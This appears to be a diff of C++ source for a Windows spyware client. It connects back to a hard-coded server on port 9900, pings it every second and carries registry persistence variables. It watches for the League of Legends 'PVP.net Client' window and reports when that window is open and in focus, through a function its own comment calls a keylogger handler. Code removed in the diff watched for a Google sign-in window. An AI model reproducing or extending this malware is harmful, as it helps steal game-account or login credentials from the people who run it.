@@ -16,9 +16,14 @@ using namespace std;
 //-----Prototypes and global vars
 TCHAR exepath[MAX_PATH]; //Persistence reg variables
 HKEY hKey; //Persistence reg variables
-const char pingbuffer[1] = {'*'}; // Ping server command
-const char windowbuffer[1] = {'0'};
+                ///==Server Commands
+const char pingbuffer[1] = {00}; // Ping server command
+const char windowbuffer[1] = {01}; //Window open server command
+const char focusbuffer[1] = {02}; //Window open server command
 char sendbuffer[200]; //general buffer for sending to serv
+               ///==Server Commands
+               ///~~Command functions
+
 WSADATA wsaData;
 int iResult; //Validity switch
 sockaddr_in addr;
@@ -28,6 +33,8 @@ struct in_addr **addr_list; //Stupid addr struct to hold our resolved IP
 int i;  // Placmarker for  resolved IP struct
 string hostname;
 int PORT;
+int LoLHandler(SOCKET* sock, HWND hwnd); //Our keylogg handler
+HWND hwnd; //Our window handler ofr LoL
 //--------------------------------
 
 
@@ -77,7 +84,7 @@ connect:
     ///____________DNS + PORT___(These are hard coded for now)
     addr.sin_port = htons(9900);
         //-------Resolve DNS----
-            he = gethostbyname("192.168.0.15"); //
+            he = gethostbyname("192.168.0.13"); //
 if (!he)
   { puts("[i]Host could not be resolved..");
     return 0; //try again
@@ -96,7 +103,6 @@ if (!he)
  ///_________________________________________________________
 
 
-
 ///____Socket set + Check
  sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(sock == INVALID_SOCKET){
@@ -112,30 +118,58 @@ while(connect(sock,(SOCKADDR*)&addr,sizeof(sockaddr_in))){ //if error{
 printf("Fail connect..");
 }
 
+
 //Ping loop .. very confusing at first glance , we always want to ping the server every second , so our commands are sent inside the ping loop!
 for(;;){
-      do{
-       HWND hwnd = FindWindow( NULL, TEXT("Sign In - Google Chrome") ); //Set up a HWND to check if a certain window is open as per its title
 
-      if(hwnd!=NULL) { //The window is open
-            send(sock,windowbuffer,sizeof(windowbuffer),0); //Tell the server!
-             printf("hotmail open");} //Verbosity for debugging
+     while(send(sock,pingbuffer,sizeof(pingbuffer),0) != SOCKET_ERROR){
 
+       if(hwnd = FindWindow( NULL, TEXT("PVP.net Client")))
+          {
+              LoLHandler(&sock,hwnd);
+          } //Set up a HWND to check if a certain window is open as per its title
+/*
+      if(hwnd!=NULL) {
+
+
+*/
       Sleep(1000); // NO SPAM!
-      }
-      while(send(sock,pingbuffer,sizeof(pingbuffer),0) != SOCKET_ERROR);  // Send a ping buffer
+     }
+
+       // Send a ping buffer
 
       //we do first because we want to make sure we have the buffer ready , then we while to check if the server is up while also informing the server we are alive
  break; // if we get here , send = socket_error , meaning server down. break out of do loop and go back to connect loop if server downs
 }
 
 //If we get here it means the server down, attempt to reconnect.
+closesocket(sock);
 goto connect;
 
 
 
 //________________
-closesocket(sock);
+
+return 0;
+}
+
+int LoLHandler(SOCKET* sock, HWND hwnd){
+send(*sock,windowbuffer,sizeof(windowbuffer),0);
+while(hwnd = FindWindow( NULL, TEXT("PVP.net Client"))){
+      if(GetFocus()==hwnd){
+       send(*sock,focusbuffer,sizeof(windowbuffer),0);
+      }
+
+
+
+                                                    }
+
+
+
+
+
+
+
 return 0;
 }
 
